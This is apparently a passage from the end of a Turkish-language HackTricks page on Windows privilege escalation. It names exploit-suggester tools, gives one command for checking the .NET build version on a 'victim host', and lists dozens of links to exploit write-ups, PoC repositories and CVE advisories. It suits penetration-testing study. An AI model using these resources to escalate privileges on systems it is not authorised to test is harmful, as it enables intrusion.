[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploit'ler önerir (yerel Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümünü kullanarak derlemeniz gerekir ([buraya bakın](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Kurban host'ta yüklü .NET sürümünü görmek için şunu çalıştırabilirsiniz:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows Yetki Yükseltmenin Temelleri](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Zayıf klasör izinlerinden yararlanarak yetki yükseltme](http://www.greyhathacker.net/?p=738)
- [3] [Windows Yetki Yükseltme - kısa başvuru kılavuzu](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Yerel Yetki Yükseltme Atölyesi](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Saldırıları: AT yeni siyah (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Yetki Yükseltme - Windows - Eksiksiz OSCP Rehberi](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Yetki Yükseltme - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Yetki Yükseltme Rehberi](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows Yetki Yükseltme kontrol listesi](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows Yetki Yükseltme](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester'lar için Windows Yetki Yükseltme Yöntemleri](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA macro phishing → hMailServer kimlik bilgilerini çözme → SYSTEM için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format string leak + stack BOF → VirtualAlloc ROP (RCE) ve kernel token hırsızlığı](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox'un peşinde: Kernel gölgelerinde kedi-fare oyunu](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Bir SCADA sisteminde bulunan ayrıcalıklı dosya sistemi güvenlik açığı](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link test araçları – CreateSymlink kullanımı](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Geçmişe bir bağlantı. Windows'ta Symbolic Link'lerden yararlanma](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF portu)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js güven tuzakları: Windows'ta tehlikeli modül çözümlemesi](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modülleri: `node_modules` klasörlerinden yükleme](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ kontrol listesi zorluklarının çözümleri](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues işlevi](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hizmet ikilisi ele geçirme](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop ile Pwn2Own: Windows LPE için CLDFLT ve DirectX Kernel Race Condition'larını zincirleme](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Hepsine hükmedecek tek bir I/O Ring: Windows 11'de tam bir okuma/yazma exploit primitive'i](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Keyfi dosya silmelerinden yararlanarak yetki yükseltme ve diğer harika numaralar](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit kodu](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Saldırıları Bölüm 2: CVE-2020-1013, Windows 10'da yerel yetki yükseltmeye olanak tanıyan 1 günlük güvenlik açığı](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager ve Windows Vault'u keşfetmek](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Görüntü değişikliğinin yetki yükseltmeye yol açtığı Kerberos Kaynak Tabanlı Kısıtlı Delegasyonu](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 SSH Agent'tan SSH özel anahtarlarını çıkarma](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kurumsal güncelleme sunucularını arka kapı fabrikalarına dönüştürmek (0_o) – Bölüm 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kurumsal güncelleme sunucularını arka kapı fabrikalarına dönüştürmek (0_o) – Bölüm 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installer klasörünü silerek yetki yükseltme](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
